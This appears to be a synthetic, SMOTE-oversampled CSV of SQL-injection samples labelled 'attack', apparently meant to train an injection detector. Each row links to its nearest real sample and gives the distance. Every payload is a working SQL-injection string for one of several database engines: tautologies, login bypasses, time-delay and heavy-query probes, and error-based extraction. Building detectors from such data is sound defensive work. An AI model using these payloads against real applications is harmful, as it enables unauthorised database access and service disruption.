id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.8166580659700727
SMOTE_000002,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,1.284843279308775
SMOTE_000003,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,0.8733907026101768
SMOTE_000004,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,1.0523138903203528
SMOTE_000005,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.1934866969074665
SMOTE_000006,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,3.576300559422375
SMOTE_000007,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,1.0358477293502193
SMOTE_000008,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,1.3838061255061753
SMOTE_000009,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,2.980659942858227
SMOTE_000010,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,2.4704696548697087
SMOTE_000011,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,0.3793327378353081
SMOTE_000012,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000047,0.285029694972474
SMOTE_000013,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.5218730944163626
SMOTE_000014,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000023,0.9024974204380256
SMOTE_000015,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.4365902882505227
SMOTE_000016,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,0.07936893911339396
SMOTE_000017,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,2.451531265741509
SMOTE_000018,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,1.571203612016352
SMOTE_000019,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,1.8291502091479075
SMOTE_000020,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,1.4050955718481153
SMOTE_000021,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,1.112084875783181
SMOTE_000022,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,1.4856876954631069
SMOTE_000023,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,1.1591177770187386
SMOTE_000024,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,0.8474367342046111
SMOTE_000025,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.20800490051890122
SMOTE_000026,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.384677041963956
SMOTE_000027,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,1.5978409725113032
SMOTE_000028,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,1.950458359650486
SMOTE_000029,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.0810411929371764
SMOTE_000030,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.876600627348587
SMOTE_000031,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.4869512472855798
SMOTE_000032,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,2.173537825431377
SMOTE_000033,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.06852989221335742
SMOTE_000034,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.2043301258781298
SMOTE_000035,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,0.49054703217253903
SMOTE_000036,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,0.2675178491673594
SMOTE_000037,attack,boolean,"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000070,0.4538598099398893
SMOTE_000038,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.6619307207386591
SMOTE_000039,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,0.755415138666531
SMOTE_000040,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,0.1841591841464906
SMOTE_000041,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000054,1.6132478530502545
SMOTE_000042,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,1.049456524825137
SMOTE_000043,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,1.3781160168931235
SMOTE_000044,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,0.6228326695181476
SMOTE_000045,attack,boolean,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk",nearest_attack_euclidean,R000046,2.958717312209563
SMOTE_000046,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,0.6536943991766646
SMOTE_000047,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000052,1.8115835773623048
SMOTE_000048,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,3.594964506520094
SMOTE_000049,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.8937017902816775
SMOTE_000050,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,1.2583559985757196
SMOTE_000051,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,0.34067833861905633
SMOTE_000052,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000007,5.008056577320971
SMOTE_000053,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.017917981930408288
SMOTE_000054,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,0.12622296755979714
SMOTE_000055,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000022,0.08009593200464678
SMOTE_000056,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,0.7520929917244894
SMOTE_000057,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.21156278566344758
SMOTE_000058,attack,boolean,admin' or '1'  =  '1'/*,nearest_attack_euclidean,R000004,4.938249158153086
SMOTE_000059,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,1.4951018944048804
SMOTE_000060,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,1.122072215926292
SMOTE_000061,attack,boolean,-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541,nearest_attack_euclidean,R000027,0.4501318553079551
SMOTE_000062,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,0.06617187721474772
SMOTE_000063,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000062,0.04914406464675525
SMOTE_000064,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,0.03130458502444639
SMOTE_000065,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,1.1609700514598846
SMOTE_000066,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000044,0.5380356684024392
SMOTE_000067,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,1.3797453714759806
SMOTE_000068,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,1.6675063885279064
SMOTE_000069,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,1.1091520368592684
SMOTE_000070,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,1.5937465065991407
SMOTE_000071,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000069,1.302322979316777
SMOTE_000072,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.1832421154762964
SMOTE_000073,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,1.48862094057637
SMOTE_000074,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000007,1.3418329478482849
SMOTE_000075,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,1.0971280512222517
SMOTE_000076,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,3.689679775124697
SMOTE_000077,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,2.2636591900594456
SMOTE_000078,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.22820656070959308
SMOTE_000079,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,1.4315575157375506
SMOTE_000080,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000056,4.128409669304789
SMOTE_000081,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,0.8163215982325169
SMOTE_000082,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,0.13355420776813956
SMOTE_000083,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,1.169019371196298
SMOTE_000084,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000062,2.303062280396072
SMOTE_000085,attack,boolean,"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,1.6653000961957467
SMOTE_000086,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000040,0.8172368915423762
SMOTE_000087,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R000078,2.2417320632749473
SMOTE_000088,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,2.691415469395857
SMOTE_000089,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,0.8918341307479579
SMOTE_000090,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000034,0.815625935381689
SMOTE_000091,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,2.7229905759405706
SMOTE_000092,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,0.6750246222473646
SMOTE_000093,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,1.8624166136997942
SMOTE_000094,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,1.0145092883240614
SMOTE_000095,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,0.685264155298753
SMOTE_000096,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,0.4120829893147882
SMOTE_000097,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,1.3127054344467868
SMOTE_000098,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000002,2.555163017916912
SMOTE_000099,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,2.6815013421523206
SMOTE_000100,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.7959043546082981
SMOTE_000101,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,1.5201496527005467
SMOTE_000102,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,0.9926936247256962
SMOTE_000103,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,2.3704617811205013
SMOTE_000104,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,0.4620609614986911
SMOTE_000105,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,2.5459161678840956
SMOTE_000106,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,1.8743149137252826
SMOTE_000107,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000019,0.9379073022519865
SMOTE_000108,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,0.8581635421104953
SMOTE_000109,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,3.653049055958896
SMOTE_000110,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000023,1.746341446366881
SMOTE_000111,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,0.072818176134819
SMOTE_000112,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,1.104932722948585
SMOTE_000113,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000060,2.0884327355389294
SMOTE_000114,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,0.7422280220385611
SMOTE_000115,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,3.012876941250733
SMOTE_000116,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,1.9022348735790222
SMOTE_000117,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,0.05138913703801682
SMOTE_000118,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,1.3218242982627317
SMOTE_000119,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,1.6023888577033143
SMOTE_000120,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,0.44858593528550433
